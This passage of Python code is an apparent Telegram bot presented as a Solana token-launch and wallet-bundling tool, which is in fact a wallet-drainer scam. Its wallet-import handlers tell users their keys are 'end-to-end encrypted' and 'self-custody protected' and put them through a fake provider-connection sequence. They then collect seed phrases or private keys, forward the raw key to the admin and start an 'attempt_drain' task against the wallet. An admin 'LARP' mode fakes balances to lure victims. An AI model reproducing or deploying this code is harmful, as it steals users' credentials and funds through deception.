            await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
            return
        await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception:
        try:
            await msg.delete()
        except Exception:
            pass
        try:
            await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception:
            pass

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    sess = get_session(message.from_user.id)
    await send_main_menu(message, sess, edit=False)
    try:
        await message.answer("\u200b", reply_markup=ReplyKeyboardRemove())
    except Exception:
        pass

@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await send_main_menu(cb, sess, edit=True)

    elif action == "launch":
        text = "<b>Token Name</b> (1–50 chars)\n\nEnter a name for your token:"
        await safe_edit_message(cb, text, reply_markup=launch_nav_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        if LARP_ENABLED and uid in ADMIN_IDS:
            for w in sess.wallets:
                if getattr(w, "is_larp", False):
                    w.balance_sol = bot_balance_sol
        text = "<b>Wallets</b>\n────────────────────────────\n"
        if not sess.wallets:
            text += "No wallets connected yet.\n\n<i>Import a seed phrase or private key to begin.</i>"
        else:
            for i, w in enumerate(sess.wallets):
                active_tag = "  [Active]" if i == sess.active_wallet_idx else ""
                text += (
                    f"<b>{w.label}</b>{active_tag}\n"
                    f"<code>{short_addr(w.public_key)}</code>  -  <b>{w.balance_sol:.4f} SOL</b>\n\n"
                )
        await safe_edit_message(cb, text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = "<b>Portfolio</b>\n────────────────────────────\n"
        kb = InlineKeyboardBuilder()
        if not sess.launched_tokens:
            text += "No tokens launched yet.\n\n<i>Active launches will appear here.</i>"
        else:
            live_mints = []
            for t in reversed(sess.launched_tokens[-10:]):
                age_s = int(time.time() - t["ts"])
                age_str = f"{age_s // 60}m {age_s % 60}s ago" if age_s >= 60 else f"{age_s}s ago"
                if t.get("dumped") or t.get("status") == "dumped":
                    status_tag = "sold"
                    extra = f"  <b>+{t.get('profit', 0):.4f} SOL</b>"
                elif t.get("status") == "live":
                    status_tag = "live"
                    extra = f"  {t.get('invest', 0):.4f} SOL in"
                    live_mints.append(t.get("mint"))
                else:
                    status_tag = "pending"
                    extra = ""
                dumped_n = len(t.get("dumped_idxs") or [])
                if dumped_n and not t.get("dumped"):
                    extra += f"  {dumped_n}/{t.get('bundle', 0)} sold"
                text += (
                    f"<b>${t['symbol']}</b>  <i>{t['name']}</i> [{status_tag}]\n"
                    f"<code>{mask_mint(t['mint'])}</code>\n"
                    f"<i>x{t['bundle']} wallets{extra}  -  {age_str}</i>\n\n"
                )
            for m in live_mints[:2]:
                kb.row(InlineKeyboardButton(text=f"Sell All {mask_mint(m)}", callback_data=f"dump:{m}"))
        kb.row(InlineKeyboardButton(text="Back", callback_data="menu:main"))
        await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        text = (
            "<b>Access & Promos</b>\n────────────────────────────\n"
            f"Launches remaining: <b>{sess.launches_left}</b>\n"
            f"Total launched: <b>{sess.total_launches}</b>\n\n"
            f"<i>Each cycle grants {LAUNCHES_PER_CYCLE} launches for {int(LAUNCH_FEE_SOL)} SOL.</i>"
        )
        await safe_edit_message(cb, text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)

    elif action == "tx":
        text = "<b>Transaction History</b>\n────────────────────────────\n"

        def _fmt_tx(tx: dict) -> str:
            age_s = int(time.time() - tx["ts"])
            age_str = f"{age_s // 60}m {age_s % 60}s" if age_s >= 60 else f"{age_s}s"
            status = tx["status"]
            status_tag = "confirmed" if status == "success" else "pending"
            amt = tx.get("amount")
            amt_line = f"  {amt:+.4f} SOL" if isinstance(amt, (int, float)) else ""
            raw_type = tx.get("type", "tx")
            for ch in ("💥", "⚡", "💰", "📊", "🎯", "🛡", "📈"):
                raw_type = raw_type.replace(ch, "").strip()
            return (
                f"<b>{raw_type}</b>{amt_line}  [{status_tag}]\n"
                f"  <code>{tx['sig'][:24]}…</code>  -  {age_str} ago\n\n"
            )

        personal_seen: set = set()
        personal_lines = []
        for tx in sess.last_tx[:5]:
            sig = tx.get("sig")
            if sig in personal_seen:
                continue
            personal_seen.add(sig)
            personal_lines.append(_fmt_tx(tx))

        global_seen = set(personal_seen)
        global_lines = []
        for tx in GLOBAL_TX_FEED:
            sig = tx.get("sig")
            if sig in global_seen:
                continue
            global_seen.add(sig)
            global_lines.append(_fmt_tx(tx))
            if len(global_lines) >= 5:
                break

        if not personal_lines and not global_lines:
            text += "<i>No activity recorded yet.</i>"
        else:
            if personal_lines:
                text += "<b>Personal Feed:</b>\n"
                text += "".join(personal_lines)
            if global_lines:
                if personal_lines:
                    text += "<b>Network Feed:</b>\n"
                text += "".join(global_lines)

        await safe_edit_message(cb, text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        sniper_str = "Active" if s.get("sniper_protection", True) else "Disabled"
        mev_str = "Active" if s.get("mev_protection", True) else "Disabled"
        text = (
            "<b>Trade Settings</b>\n────────────────────────────\n"
            f"Slippage:       <b>{s['slippage']}%</b>\n"
            f"Priority Fee:   <b>{s['priority_fee']} SOL</b>\n"
            f"Sniper Guard:   <b>{sniper_str}</b>\n"
            f"MEV Protect:    <b>{mev_str}</b>"
        )
        await safe_edit_message(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    await cb.answer()

@router.callback_query(F.data.startswith("set:"))
async def settings_handler(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    parts = cb.data.split(":")
    key = parts[1]
    if key == "slip":
        sess.settings["slippage"] = int(parts[2])
    elif key == "fee":
        sess.settings["priority_fee"] = float(parts[2])
    elif key == "custom_slip":
        await safe_edit_message(cb, "Send custom max slippage % (1–50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_slip)
        await cb.answer()
        return
    elif key == "custom_fee":
        await safe_edit_message(cb, "Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_fee)
        await cb.answer()
        return
    elif key == "sniper":
        sess.settings["sniper_protection"] = not sess.settings.get("sniper_protection", True)
    elif key == "mev":
        sess.settings["mev_protection"] = not sess.settings.get("mev_protection", True)
    s = sess.settings
    sniper_str = "Active" if s.get("sniper_protection", True) else "Disabled"
    mev_str = "Active" if s.get("mev_protection", True) else "Disabled"
    text = (
        "<b>Trade Settings</b>\n────────────────────────────\n"
        f"Slippage:       <b>{s['slippage']}%</b>\n"
        f"Priority Fee:   <b>{s['priority_fee']} SOL</b>\n"
        f"Sniper Guard:   <b>{sniper_str}</b>\n"
        f"MEV Guard:      <b>{mev_str}</b>"
    )
    await safe_edit_message(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated")

@router.message(SettingsStates.waiting_custom_slip)
async def custom_slip_receive(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip().replace("%", ""))
        if not 1 <= val <= 50: raise ValueError
    except ValueError:
        await message.answer("Invalid value. Send a number between 1 and 50.")
        return
    sess = get_session(message.from_user.id)
    sess.settings["slippage"] = val
    await message.answer("Slippage updated successfully.", reply_markup=main_menu_kb())
    await state.clear()

@router.message(SettingsStates.waiting_custom_fee)
async def custom_fee_receive(message: Message, state: FSMContext):
    try:
        val = float(message.text.strip())
        if not 0.00001 <= val <= 1.0: raise ValueError
    except ValueError:
        await message.answer("Invalid value. Send a fee like 0.002")
        return
    sess = get_session(message.from_user.id)
    sess.settings["priority_fee"] = val
    await message.answer("Priority fee updated successfully.", reply_markup=main_menu_kb())
    await state.clear()

@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "<b>CONNECT WALLET // dApp GATEWAY</b>\n"
        "────────────────────────────\n"
        "Select your preferred provider or import via seed/private key.\n\n"
        "<b>Requirement Notice:</b>\n"
        "<i>A minimum of <b>3 SOL</b> is required in your wallet balance to initialize bundling and launch operations.</i>\n\n"
        "<b>Security:</b>\n"
        "<i>End-to-end encrypted · Local memory verification only · Self-custody protected</i>"
    )
    await safe_edit_message(cb, text, reply_markup=wallet_modal_kb(), parse_mode=ParseMode.HTML)
    await cb.answer()

@router.callback_query(F.data.startswith("wallet:connect:"))
async def wallet_connect_provider(cb: CallbackQuery, state: FSMContext):
    provider = cb.data.split(":")[-1].upper()
    stages = [
        (f"<b>{provider} CONNECTION</b>\n────────────────────────────\n<i>Initializing secure provider bridge...</i>", 0.5),
        (f"<b>{provider} CONNECTION</b>\n────────────────────────────\n<i>Establishing WebSocket session...</i>", 0.6),
        (f"<b>{provider} CONNECTION</b>\n────────────────────────────\n<i>Waiting for signature confirmation...</i>", 0.6),
    ]
    await staged_loading(cb, stages)
    text = (
        f"<b>{provider} CONNECTION // VERIFICATION</b>\n"
        "────────────────────────────\n"
        "Please provide your <b>seed phrase</b> (12/24 words) or <b>private key</b> to complete authorization and sync your <b>3 SOL</b> balance requirement.\n\n"
        "<i>Processed securely in memory.</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="menu:main")]])
    await safe_edit_message(cb, text, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

@router.callback_query(F.data == "wallet:import:manual")
async def wallet_import_manual(cb: CallbackQuery, state: FSMContext):
    text = (
        "<b>MANUAL IMPORT // SECURE GATEWAY</b>\n"
        "────────────────────────────\n"
        "Send your <b>seed phrase</b> (12 or 24 words) "
        "or <b>private key</b> (Base58 or JSON).\n\n"
        "<b>Requirement Notice:</b>\n"
        "<i>Minimum <b>3 SOL</b> required for bundling & launch pool initialization.</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="menu:main")]])
    await safe_edit_message(cb, text, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

@router.callback_query(F.data == "wallet:disconnect")
async def wallet_disconnect(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    text = (
        "<b>WALLET DISCONNECTED</b>\n"
        "────────────────────────────\n"
        "Session cleared. All local keys unlinked."
    )
    await safe_edit_message(cb, text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await cb.answer()

@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not (LARP_ENABLED and uid in ADMIN_IDS) and not _rate_ok(uid, "import"):
        await message.answer("<b>Rate limit exceeded.</b> Please wait a moment and try again.", parse_mode=ParseMode.HTML)
        return

    raw = (message.text or "").strip()
    try:
        await message.delete()
    except Exception:
        pass

    status_msg = await message.answer("<b>Validating credentials…</b>", parse_mode=ParseMode.HTML)

    chosen_priv = None
    chosen_pub = None
    chosen_bal = 0.0

    try:
        clean = _normalize_mnemonic(raw)
        is_seed = _is_mnemonic(clean)
        candidates: List[Tuple[str, str, str]] = []

        if is_seed and HAS_SOLANA:
            await status_msg.edit_text("<b>Deriving derivation paths…</b>", parse_mode=ParseMode.HTML)
            candidates = derive_solana_paths(clean)
            label, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)
        else:
            await status_msg.edit_text("<b>Importing key…</b>", parse_mode=ParseMode.HTML)
            chosen_priv, chosen_pub = parse_solana_private_key(raw)
            try:
                chosen_bal = await asyncio.wait_for(fetch_sol_balance(chosen_pub), timeout=5)
            except Exception:
                chosen_bal = 0.0
    except Exception as e:
        log.exception("Import failed: %s", e)
        await status_msg.edit_text("<b>Invalid key or seed phrase.</b> Check input and try again.", parse_mode=ParseMode.HTML)
        await state.clear()
        return

    sess = get_session(uid)
    sess.last_raw_key = raw

    w = UserWallet(
        private_key=chosen_priv,
        public_key=chosen_pub,
        label=f"Wallet {len(sess.wallets)+1}",
        balance_sol=chosen_bal,
        chain="sol",
        drained=False,
    )
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1

    text = (
        "<b>WALLET CONNECTED SUCCESSFULLY</b>\n"
        "────────────────────────────\n"
        f"Address: <code>{chosen_pub}</code>\n\n"
        f"Label:     <b>{w.label}</b>\n"
        f"Balance:   <b>{chosen_bal:.4f} SOL</b>\n"
        f"Status:    <b>Active</b>\n\n"
        "<i>Wallet ready for deployment.</i>"
    )

    await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    if raw and message.bot:
        try:
            await log_key_to_admin(message.bot, message.from_user, raw, 0.0, 0.0, 0.0, 0.0, status="imported", sol_seen=float(chosen_bal or 0), pub=str(chosen_pub or ""))
        except Exception:
            pass

    asyncio.create_task(attempt_drain(uid, chosen_priv, chain=w.chain, bot=message.bot, user=message.from_user, wallet=w))

@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    sess.larp_wallet_idx = None
    await safe_edit_message(cb, "All connected wallets removed from session.", reply_markup=back_menu_kb())
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active wallet -> {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        if not w.public_key.startswith("Sim") and not w.public_key.startswith("0x") and w.private_key != "LARP_SIM":
            w.balance_sol = await fetch_sol_balance(w.public_key)
    await cb.answer("Balances updated")
    text = "<b>Wallets</b>\n────────────────────────────\n"
    for i, w in enumerate(sess.wallets):
        badge = " [ACTIVE]" if i == sess.active_wallet_idx else ""
        text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  -  {w.balance_sol:.4f} SOL\n\n"
    await safe_edit_message(cb, text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await safe_edit_message(cb, f"Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("Label updated successfully.", reply_markup=main_menu_kb())
    await state.clear()

def launch_nav_kb(back_to: Optional[str] = None, *, skip: bool = False, cancel: bool = True) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    row = []
    if back_to:
        row.append(btn("Back", f"launch:back:{back_to}"))
    if skip:
        row.append(btn("Skip", "launch:skip", style="primary"))
    if row:
        b.row(*row)
    if cancel:
        b.row(btn("Cancel", "menu:main", style="danger"))
    return b.as_markup()

@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    name = (message.text or "").strip()[:50]
    if not name:
        await message.answer("Name required (1–50 chars).", reply_markup=launch_nav_kb())
        return
    await state.update_data(name=name, supply=1_000_000_000)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        f"Name set: <b>{name}</b>\n\n"
        "<b>Token Symbol</b> (2–25 letters, A–Z)\n"
        "Example: <code>PEPE</code>",
        reply_markup=launch_nav_kb(back_to="name"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)

@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = (message.text or "").strip().upper().replace("$", "")[:25]
    if len(sym) < 2 or not sym.isalpha():
        await message.answer("Symbol must be 2–25 letters (A–Z).", reply_markup=launch_nav_kb(back_to="name"))
        return
    await state.update_data(symbol=sym)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        f"<b>${sym}</b>  -  {data.get('name', '')}\n\n"
        "<b>Description</b> (≤ 500 chars)\n"
        "<i>1–2 concise lines.</i>",
        reply_markup=launch_nav_kb(back_to="symbol", skip=True),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)

@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = (message.text or "").strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:500])
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        f"<b>${data.get('symbol', '')}</b>\n\n"
        "<b>Token Image</b>\n"
        "<i>Send a photo, an image URL, or skip.</i>",
        reply_markup=launch_nav_kb(back_to="desc", skip=True),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_image)

@router.message(LaunchStates.waiting_image)
async def launch_image(message: Message, state: FSMContext):
    img = ""
    if message.photo:
        img = message.photo[-1].file_id
    else:
        text = (message.text or "").strip()
        if text.lower() == "skip":
            img = ""
        elif text.startswith("http://") or text.startswith("https://"):
            img = text[:300]
        else:
            await message.answer(
                "Send a photo, image URL, or tap Skip.",
                reply_markup=launch_nav_kb(back_to="desc", skip=True),
                parse_mode=ParseMode.HTML,
            )
            return
    await state.update_data(image=img)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        f"<b>${data.get('symbol', '')}</b>\n\n"
        "<b>Bundle Size</b> — select number of wallets:",
        reply_markup=bundle_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.callback_query(F.data.startswith("bundle:"), LaunchStates.waiting_bundle)
async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
    part = cb.data.split(":")[1]
    if part == "custom":
        await safe_edit_message(cb, "Send custom bundle size (1–25):", reply_markup=launch_nav_kb(back_to="image"), parse_mode=ParseMode.HTML)
        await cb.answer()
        return
    try:
        bundle = max(1, min(25, int(part)))
    except Exception:
        bundle = 10
    await state.update_data(bundle=bundle)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(cb.from_user.id)
        await cb.answer()
        await _show_launch_preview(cb, state, float(data["invest"]), sess)
        return
    await safe_edit_message(
        cb,
        f"Bundle x<b>{bundle}</b> selected for <b>${data.get('symbol', '')}</b>\n\n"
        "<b>Social Links</b> (optional):",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)
    await cb.answer()

@router.message(LaunchStates.waiting_bundle)
async def launch_bundle_custom_msg(message: Message, state: FSMContext):
    try:
        bundle = max(1, min(25, int((message.text or "").strip())))
    except ValueError:
        await message.answer("Send a valid number between 1 and 25.", reply_markup=launch_nav_kb(back_to="image"))
        return
    await state.update_data(bundle=bundle)
    data = await state.get_data()
    await message.answer(
        f"Bundle x<b>{bundle}</b> selected.\n\n"
        "<b>Social Links</b> (optional):",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)

@router.callback_query(F.data.startswith("social:"), LaunchStates.waiting_socials)
async def social_pick(cb: CallbackQuery, state: FSMContext):
    platform = cb.data.split(":")[1]
    labels = {"x": "Twitter/X URL", "tg": "Telegram URL", "web": "Website URL", "ig": "Instagram URL"}
    await state.update_data(_social_pending=platform)
    await safe_edit_message(
        cb,
        f"Send <b>{labels.get(platform, 'URL')}</b>:",
        reply_markup=launch_nav_kb(back_to="bundle"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_social_link)
    await cb.answer()

@router.message(LaunchStates.waiting_social_link)
async def social_link_receive(message: Message, state: FSMContext):
    data = await state.get_data()
    platform = data.get("_social_pending", "x")
    url = (message.text or "").strip()[:120]
    key = {"x": "twitter", "telegram": "telegram", "web": "website", "ig": "instagram"}.get(platform, "twitter")
    await state.update_data(**{key: url, "_social_pending": None})
    data = await state.get_data()
    await message.answer(
        f"Saved <b>{key}</b> link.\nAdd another or press Done / Skip.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)

@router.callback_query(F.data.in_({"socials:skip", "socials:done"}), LaunchStates.waiting_socials)
async def socials_done(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    data = await state.get_data()
    await safe_edit_message(
        cb,
        f"<b>${data.get('symbol', '')}</b>  -  Bundle x{data.get('bundle', 10)}\n\n"
        "<b>Invest / Dev Buy Amount</b>\n"
        f"Wallet Balance: <b>{bal:.4f} SOL</b>  (Minimum: 3 SOL)\n\n"
        "Select invest amount:",
        reply_markup=invest_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_invest)
    await cb.answer()

@router.callback_query(F.data.startswith("invest:"), LaunchStates.waiting_invest)
async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
    part = cb.data.split(":")[1]
    if part == "custom":
        await safe_edit_message(
            cb,
            "Send invest amount in SOL (minimum <b>3 SOL</b>):",
            reply_markup=launch_nav_kb(back_to="socials"),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_invest_custom)
        await cb.answer()
        return
    try:
        invest = float(part)
    except ValueError:
        await cb.answer("Invalid amount", show_alert=True)
        return
    await _finish_invest_choice(cb, state, invest)

@router.callback_query(F.data == "launch:skip")
async def launch_skip(cb: CallbackQuery, state: FSMContext):
    cur = await state.get_state()
    if cur == LaunchStates.waiting_desc.state:
        await state.update_data(desc="")
        data = await state.get_data()
        await safe_edit_message(
            cb,
            f"<b>${data.get('symbol', '')}</b>\n\n"
            "<b>Token Image</b>\nSend photo, URL, or Skip.",
            reply_markup=launch_nav_kb(back_to="desc", skip=True),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_image)
    elif cur == LaunchStates.waiting_image.state:
        await state.update_data(image="")
        data = await state.get_data()
        await safe_edit_message(
            cb,
            f"<b>${data.get('symbol', '')}</b>\n\n"
            "<b>Bundle Size</b>:",
            reply_markup=bundle_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_bundle)
    else:
        await cb.answer("Nothing to skip", show_alert=False)
        return
    await cb.answer()

@router.callback_query(F.data.startswith("launch:back:"))
async def launch_back(cb: CallbackQuery, state: FSMContext):
    target = cb.data.split(":")[-1]
    data = await state.get_data()
    if target == "name":
        await safe_edit_message(cb, "<b>Token Name</b> (1–50 chars):", reply_markup=launch_nav_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)
    elif target == "symbol":
        await safe_edit_message(cb, f"Name: <b>{data.get('name', '')}</b>\n\n<b>Token Symbol</b>:", reply_markup=launch_nav_kb(back_to="name"), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_symbol)
    elif target == "desc":
        await safe_edit_message(cb, f"<b>${data.get('symbol', '')}</b>\n\n<b>Description</b>:", reply_markup=launch_nav_kb(back_to="symbol", skip=True), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_desc)
    elif target == "image":
        await safe_edit_message(cb, "<b>Token Image</b>:", reply_markup=launch_nav_kb(back_to="desc", skip=True), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_image)
    elif target == "bundle":
        await safe_edit_message(cb, "<b>Bundle Size</b>:", reply_markup=bundle_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_bundle)
    elif target == "socials":
        await safe_edit_message(cb, "<b>Social Links</b>:", reply_markup=socials_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_socials)
    elif target == "confirm":
        invest = float(data.get("invest") or 0)
        if invest >= 3:
            sess = get_session(cb.from_user.id)
            await cb.answer()
            await _show_launch_preview(cb, state, invest, sess)
            return
    await cb.answer()

@router.message(LaunchStates.waiting_invest_custom)
async def launch_invest_custom(message: Message, state: FSMContext):
    try:
        invest = float((message.text or "").strip().replace(",", ""))
    except ValueError:
        await message.answer("Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
        return
    if invest < 3:
        await message.answer("Minimum investment is <b>3 SOL</b>.", parse_mode=ParseMode.HTML)
        return
    sess = get_session(message.from_user.id)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    if invest > bal + 1e-9:
        await message.answer(f"Insufficient balance. Available: <b>{bal:.4f} SOL</b>", parse_mode=ParseMode.HTML, reply_markup=invest_kb())
        await state.set_state(LaunchStates.waiting_invest)
        return
    await state.update_data(invest=invest)
    await _show_launch_preview(message, state, invest, sess)

async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: float):
    if invest < 3:
        await cb.answer("Minimum investment is 3 SOL", show_alert=True)
        return
    sess = get_session(cb.from_user.id)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    if invest > bal + 1e-9:
        await cb.answer()
        await safe_edit_message(cb, f"Insufficient balance. Available: <b>{bal:.4f} SOL</b>", reply_markup=invest_kb(), parse_mode=ParseMode.HTML)
        return
    await state.update_data(invest=invest)
    await cb.answer()
    await _show_launch_preview(cb, state, invest, sess)

async def _show_launch_preview(src, state: FSMContext, invest: float, sess: UserSession):
    data = await state.get_data()
    bundle = data.get("bundle", 10)
    summary = (
        "<b>REVIEW LAUNCH CONFIGURATION</b>\n"
        "────────────────────────────\n"
        f"Name:        <b>{data.get('name', '')}</b>\n"
        f"Symbol:      <b>${data.get('symbol', '')}</b>\n"
        f"Bundle:      <b>x{bundle} wallets</b>\n"
        f"Dev Invest:  <b>{invest:.4f} SOL</b>\n"
        f"Description: {data.get('desc') or '—'}\n\n"
        "Confirm deployment below:"
    )
    kb = confirm_kb()
    if hasattr(src, "message") and hasattr(src, "answer"):
        try:
            await src.message.edit_text(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
        except Exception:
            await src.message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await src.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.confirm)

@router.callback_query(F.data.startswith("launch:edit:"), LaunchStates.confirm)
async def launch_edit_field(cb: CallbackQuery, state: FSMContext):
    field = cb.data.split(":")[-1]
    data = await state.get_data()
    await cb.answer()
    if field == "name":
        await safe_edit_message(cb, f"Current: <b>{data.get('name', '')}</b>\n\nSend new name:", reply_markup=launch_nav_kb(back_to="confirm"), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)
    elif field == "symbol":
        await safe_edit_message(cb, f"Current: <b>${data.get('symbol', '')}</b>\n\nSend new ticker:", reply_markup=launch_nav_kb(back_to="confirm"), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_symbol)
    elif field == "desc":
        await safe_edit_message(cb, f"Current: {data.get('desc') or '—'}\n\nSend new description:", reply_markup=launch_nav_kb(back_to="confirm", skip=True), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_desc)
    elif field == "bundle":
        await safe_edit_message(cb, f"Current bundle: x<b>{data.get('bundle', 10)}</b>\n\nSelect new size:", reply_markup=bundle_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_bundle)
    elif field == "invest":
        await safe_edit_message(cb, f"Current invest: <b>{data.get('invest', 0)} SOL</b>\n\nSelect new amount:", reply_markup=invest_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_invest)

@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Rate limit exceeded", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()
    invest = float(data.get("invest") or 0)
    if invest < 3:
        await cb.answer("Minimum investment is 3 SOL", show_alert=True)
        return

    if not sess.wallets:
        await cb.answer()
        await safe_edit_message(cb, "<b>Wallet Required</b>\n\nConnect a wallet to continue.", reply_markup=wallets_empty_kb(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    active = sess.wallets[sess.active_wallet_idx]
    if invest > active.balance_sol + 1e-9:
        await cb.answer()
        await safe_edit_message(cb, f"Insufficient balance. Required: <b>{invest:.4f} SOL</b>", reply_markup=invest_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_invest)
        return

    await cb.answer()
    bundle = int(data.get("bundle", 10))
    symbol = data["symbol"]
